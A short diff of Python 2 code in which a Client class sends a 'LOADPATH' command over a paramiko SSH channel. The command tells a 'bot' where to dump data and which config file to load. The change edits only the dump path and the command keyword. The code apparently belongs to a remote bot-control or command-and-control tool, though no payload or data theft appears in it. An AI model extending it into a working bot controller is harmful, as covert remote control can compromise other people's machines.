@@ -4,7 +4,7 @@ from paramiko import  RSAKey
 import ChannelSSH
 from time import  time
 host_key = RSAKey(filename='./rsa.key')
-path_destination = "./dump_dir/"
+path_destination = "bot/dump/"
 path_source = "bot/fichi.cnf"
 class Client():
 
@@ -21,7 +21,7 @@ class Client():
 
     def initialise_bot(self):
         try:
-            ChannelSSH.sendToChannel("LOADPATH;"+path_destination+""+self.getAddr()+""+self.tags+";"+path_source,self.chan)
+            ChannelSSH.sendToChannel("**LOADPATH**;"+path_destination+""+self.getAddr()+""+self.tags+";"+path_source,self.chan)
         except Exception, e:
             print "Initialisation of path: " + str(e)
     def connect(self):
